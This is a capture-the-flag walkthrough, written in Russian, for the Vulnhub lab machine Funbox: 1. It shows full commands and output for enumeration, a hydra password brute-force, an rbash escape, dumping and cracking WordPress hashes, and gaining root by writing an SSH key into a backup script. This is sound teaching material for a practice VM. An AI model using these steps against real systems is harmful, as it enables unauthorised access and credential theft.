# Funbox: 1
## Vulnhub machine

- Название: Funbox: 1  
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Beginner
- Дата релиза: 20.07.20
- Оригинальное описание: 
>Boot2Root ! This is a reallife szenario, but easy going. You have to enumerate and understand the szenario to get the root-flag in round about 20min.
This VM is created/tested with Virtualbox. Maybe it works with vmware.
If you need hints, call me on twitter: @0815R2d2
Have fun...
This works better with VirtualBox rather than VMware

## Write-up

```html
┌─[root@parrot-virtual]─[/home/user]
└──╼ #nmap -sV -A 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:12 BST
Nmap scan report for funbox.fritz.box (192.168.56.101)
Host is up (0.00089s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry 
|_/secret/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Funbox &#8211; Have fun&#8230;.
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:A7:1E:4F (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/27%OT=21%CT=1%CU=38398%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=5F47DB88%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.89 ms funbox.fritz.box (192.168.56.101)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.53 seconds
```

>Добавим выделенный адрес в hosts и проверим директории:

```html 
┌─[root@parrot-virtual]─[/home/user]
└──╼ #gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://funbox.fritz.box/ -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://funbox.fritz.box/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/27 17:23:45 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/wp-content (Status: 301)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
/index.php (Status: 301)
===============================================================
2020/08/27 17:23:55 Finished
===============================================================
```

>Видим стандартные директории wordpress, воспользуемся wpscan:

```html
┌─[✗]─[root@parrot-virtual]─[/home/user]
└──╼ #wpscan -eu --url http://funbox.fritz.box/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://funbox.fritz.box/ [192.168.56.101]
[+] Started: Thu Aug 27 18:15:15 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://funbox.fritz.box/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://funbox.fritz.box/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://funbox.fritz.box/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://funbox.fritz.box/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://funbox.fritz.box/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://funbox.fritz.box/index.php/feed/, https://wordpress.org/?v=5.4.2
 |  - http://funbox.fritz.box/index.php/comments/feed/, https://wordpress.org/?v=5.4.2

[+] WordPress theme in use: twentyseventeen
 | Location: http://funbox.fritz.box/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://funbox.fritz.box/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Aug 27 18:15:19 2020
[+] Requests Done: 26
[+] Cached Requests: 36
[+] Data Sent: 6.525 KB
[+] Data Received: 257.882 KB
[+] Memory used: 161.641 MB
[+] Elapsed time: 00:00:03
```

>Теперь у нас есть имена юзеров, попробуем получить доступ к ftp:

```html
┌─[root@parrot-virtual]─[/home/user]
└──╼ #hydra -V -f -l joe -P rockyou.txt -t 4 http-post-form://funbox.fritz.box -m "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&testcookie=1:S=302"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-27 18:25:47
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking http-post-form://funbox.fritz.box:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&testcookie=1:S=302
[ATTEMPT] target funbox.fritz.box - login "joe" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target funbox.fritz.box - login "joe" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target funbox.fritz.box - login "joe" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target funbox.fritz.box - login "joe" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target funbox.fritz.box - login "joe" - pass "iloveyou" - 5 of 14344399 [child 3] (0/0)
[80][http-post-form] host: funbox.fritz.box   login: joe password: 12345
[STATUS] attack finished for funbox.fritz.box (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-27 18:26:00
```

>Получен пароль, но в админке у нас привилегии простого юзера. Установлена последняя версия wordpress и нет уязвимых плагинов, пробуем с тем же паролем войти по ssh:

```html
┌─[root@parrot-virtual]─[/home/user]
└──╼ #ssh joe@funbox.fritz.box
joe@funbox.fritz.box's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 27 Aug 2020 05:30:18 PM UTC

  System load:  0.05              Processes:               126
  Usage of /:   58.0% of 9.78GB   Users logged in:         0
  Memory usage: 60%               IPv4 address for enp0s3: 192.168.56.101
  Swap usage:   1%

 * "If you've been waiting for the perfect Kubernetes dev solution for
   macOS, the wait is over. Learn how to install Microk8s on macOS."

   https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/

33 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Sat Jul 18 10:02:39 2020 from 192.168.178.143
```

>Пароль подошел и сразу видим, что у юзер получил какое-то письмо:

```html
joe@funbox:~$ ls
mbox
joe@funbox:~$ cat mbox
From root@funbox  Fri Jun 19 13:12:38 2020
Return-Path: root@funbox
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
	id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
Subject: Backups
To: joe@funbox
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: 20200619131238.2D257446B0@funbox.fritz.box
Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
From: root root@funbox

Hi Joe, please tell funny the backupscript is done.

From root@funbox  Fri Jun 19 13:15:21 2020
Return-Path: root@funbox
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
	id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
Subject: Backups
To: joe@funbox
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: 20200619131521.8E2D4446B0@funbox.fritz.box
Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
From: root root@funbox

Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.
```

>При попытке покинуть текущую директорию или просмотреть разрешения юзера, выдало такое оповещение:

```html
joe@funbox:~$ find / -perm -u=s -type f 2>/dev/null
-rbash: /dev/null: <mark>restricted: cannot redirect output
```

>Чтобы избавиться от этого, достаточно заспавнить оболочку:

```html
joe@funbox:~$ python -c 'import pty; pty.spawn("/bin/bash")'
```

>Идем дальше:

```html
joe@funbox:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/snap/core18/1880/bin/mount
/snap/core18/1880/bin/ping
/snap/core18/1880/bin/su
/snap/core18/1880/bin/umount
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1880/usr/lib/openssh/ssh-keysign
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/snap/snapd/8790/usr/lib/snapd/snap-confine
/snap/snapd/8542/usr/lib/snapd/snap-confine
```

>Ничего интересного, проверим стандартные wordpress конфиги:

```html
joe@funbox://var/www/html$ cat wp-config.php
?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', '<mark>wordpress</mark>');

/** MySQL database password */
define('DB_PASSWORD', '<mark>wordpress</mark>');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'XoG@ ~NREq>KmifHIofG$<,XFuwf01jsl_q@ }h=C>y>*jFmj.~t2f2]jw0xz#|v');
define('SECURE_AUTH_KEY',  'cSdjG`8nTt~& 1,3iDc}I}[benwi3=bg=OVFO1XYWtcRox:(>&q=tg8Dd7@0Sfj0');
define('LOGGED_IN_KEY',    'b@73Y(e=XpW1UD4LVs.d#uw*%pJz[#&d)k}SZS17z5&Gh.0:bQz+ZDE7)cY~VQ5O');
define('NONCE_KEY',        'v]iMUM39xx26}Zc$OE;0VjrU0]L.p-hpn}f@}NI6t#qc237sE-Cjz6$k]a~6(^vm');
define('AUTH_SALT',        'IZ@$jOgTOt4qy9%<9|uN)`Sk55CG0tTqz0NI: O J}AD?Um*#?;;^OvPj-u7{J|U');
define('SECURE_AUTH_SALT', 'Y]F95C8T*1bYU[3s^lJ1}N!nk]c%QG.(%7i^A!Fcox-)CtN$&#A.a|Clxy.9N~rj');
define('LOGGED_IN_SALT',   'La]EJG*f8R;JuG+kdhU,v=:fD`Lk?$s<RB-SP~%l?$Znov.gSOA)#Cj>8;7cH?dq');
define('NONCE_SALT',       '&XGPFF)qO?iONGxle%Rc;<gb!h^aQwN*7_bdg^r#$`V%EDlw.O<vxh2IFLS;N3ER;
```

>Входим в mysql с паролем:

```html
joe@funbox:~$ mysql -u wordpress -p wordpress
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 177
Server version: 8.0.20-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show database;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'database' at line 1
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.00 sec)

mysql> use wordpress
Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)



mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | admin      | $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1 | admin         | funny@funbox.box |          | 2020-06-19 11:32:16 |                                               |           0 | admin        |
|  2 | joe        | $P$BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1 | joe           | joe@funbox.box   |          | 2020-06-19 11:46:42 | 1592567203:$P$B7eKG/1s3GPGXCUM/h.lmWqaZ2Udvq1 |           0 | joe miller   |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
2 rows in set (0.00 sec)
```

>Получаем пароль из хеша юзера admin:

```html
┌─[root@parrot-virtual]─[/home/user/Downloads]
└──╼ #john hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 48 needed for performance.
Warning: Only 32 candidates buffered for the current salt, minimum 48 needed for performance.
Warning: Only 41 candidates buffered for the current salt, minimum 48 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 23 candidates buffered for the current salt, minimum 48 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
iubire           (admin)
1g 0:00:00:00 DONE 2/3 (2020-08-27 18:47) 3.030g/s 9590p/s 9590c/s 9590C/s samsung..karla
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```

>В домашней директории funny есть скрытый файл .backup.sh, который создает архив директории /var/www/html. Отредактируем его, но сначала создадим ключи:

```html
┌─[root@parrot-virtual]─[/home/user/Downloads]
└──╼ #ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:+8AktJNhtp5jAGo4xm/cEM7SQJz8LXFt8jYDBeOdTx4 root@parrot-virtual
The key's randomart image is:
+---[RSA 3072]----+
|o..  o+.         |
|.+ ..+oo.        |
| .o.+.Xo E       |
|o.=+.= X+ .      |
|+= =o B So       |
|o.+ oo * .       |
|   + .= +        |
|  .  . . o       |
|          .      |
+----[SHA256]-----+
```

>Далее переходим к редактированию, вписываем в файл authorized_keys свой публичный ключ:

```html
joe@funbox://home/funny$ nano .backup.sh

cd /root; mkdir .ssh; cd .ssh; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDake9WdQhw88nnKwei6d9ebyLFAEQainBewt6j0Or+ZmHraxjZLbyY/7K2Cknh1ibaDEjDxEY1V5jPj83r94EMutCa22Wm5/MCwiNC7c4cOSsuTXoo4fYIe9LxUtP4zoiyRNie+Jun+zSZvPWKVWcjHrsfIu+1AQBEbcz0dTrdu9BUdvpvg9PgNcR3mq+W4CQArSvxa3RRcySQS/u5c0PaK1AU9KyDYaFREDNPdHc+v7HKNcY2UxdmJzczYXHRPQ9XenOW04OXrsjB/fYC9SbknATQVsyDStof5SGRsGjhktTNlX9oDm2XbtRqt37dPNw+B3PFyhANESacSm3kyl5vT3TrBd4koUssgD3IOzpFc/yH4+HmwElSM2g6wiF2iEnTVFSj3HiBOl1Nue5+SmDSjA4zTym1XuCcZll3rXSRKYWuphW96q95PH+HUw1siKWdtTiDk0PHAxS1R6Et0EaLjeNrEjuiKJcERFAJp3zinOZDM74ilogC4Xr1sJikbyM= root@parrot-virtual" > authorized_keys
```

>Заходим как root и берем флаг:

```html
┌─[✗]─[root@parrot-virtual]─[//root/.ssh]
└──╼ #ssh 192.168.56.101 -l root
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 27 Aug 2020 07:30:15 PM UTC

  System load:  0.04              Processes:               134
  Usage of /:   58.1% of 9.78GB   Users logged in:         1
  Memory usage: 57%               IPv4 address for enp0s3: 192.168.56.101
  Swap usage:   5%

 * "If you've been waiting for the perfect Kubernetes dev solution for
   macOS, the wait is over. Learn how to install Microk8s on macOS."

   https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/

33 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have new mail.
Last login: Fri Jun 19 14:34:22 2020
root@funbox:~# id
uid=0(root) gid=0(root) groups=0(root)


root@funbox://root# ls
flag.txt  mbox  snap
root@funbox://root# cat flag.txt
Great ! You did it...
FUNBOX - made by @0815R2d2
```
